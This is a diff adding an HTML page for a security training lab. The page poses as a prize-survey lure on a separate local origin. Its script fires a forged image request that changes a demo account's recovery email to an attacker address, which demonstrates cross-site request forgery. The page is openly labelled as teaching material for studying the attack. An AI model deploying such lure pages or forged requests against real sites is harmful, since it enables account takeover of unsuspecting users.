@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Prize Survey | Demo attacker origin</title>
+    <style>
+      :root { color-scheme: light; --ink:#202733; --muted:#667085; --paper:#fbfcff; --line:#d9dfeb; --blue:#3157bd; --soft:#eef3ff; }
+      * { box-sizing:border-box; } body { margin:0; min-height:100vh; display:grid; place-items:center; background:#f4f6fa; color:var(--ink); font:16px/1.5 system-ui,-apple-system,"Segoe UI",sans-serif; }
+      main { width:min(620px, calc(100% - 32px)); background:var(--paper); border:1px solid var(--line); border-radius:12px; padding:36px; }
+      .brand { color:var(--blue); font-weight:800; font-size:.85rem; letter-spacing:.04em; } h1 { letter-spacing:-.035em; line-height:1.06; margin:14px 0 12px; font-size:clamp(2rem,7vw,3.3rem); } p { color:var(--muted); } button { border:0; border-radius:7px; padding:11px 15px; background:var(--blue); color:white; font:700 .92rem system-ui,sans-serif; cursor:pointer; } button:hover { background:#25449a; } code { display:block; padding:12px; overflow:auto; color:#1e367b; background:var(--soft); border-radius:7px; font-size:.76rem; } #status { min-height:24px; margin:16px 0 0; color:#3157bd; font-weight:650; } .lab-note { margin-top:30px; padding-top:14px; border-top:1px solid var(--line); font-size:.78rem; } .lab-note strong { color:#9a5e00; }
+    </style>
+  </head>
+  <body>
+    <main>
+      <div class="brand">ACME SURVEY REWARDS</div>
+      <h1>One question away from your reward.</h1>
+      <p>Click to load the next survey question.</p>
+      <button id="run">Continue to question</button>
+      <p id="status" aria-live="polite"></p>
+      <div class="lab-note">
+        <strong>Training lab annotation:</strong> this server is deliberately a different origin, <code>localhost:3001</code>. The button injects the exact hidden image request below. Browsers allow an image to load cross-origin, so no CORS permission is required.
+      </div>
+      <details>
+        <summary>Show exact payload</summary>
+        <code id="payload"></code>
+      </details>
+    </main>
+    <script>
+      const victimRequest = "http://localhost:3000/api/account/recovery-email?email=intruder%40malicious.test";
+      document.querySelector("#payload").textContent = `<img src="${victimRequest}" alt="">`;
+      document.querySelector("#run").addEventListener("click", () => {
+        const forgedImage = new Image();
+        forgedImage.alt = "";
+        forgedImage.src = victimRequest;
+        document.body.appendChild(forgedImage);
+        document.querySelector("#status").textContent = "Request sent. Return to the Account Security Lab tab to inspect the account state and server-side event log.";
+      });
+    </script>
+  </body>
+</html>
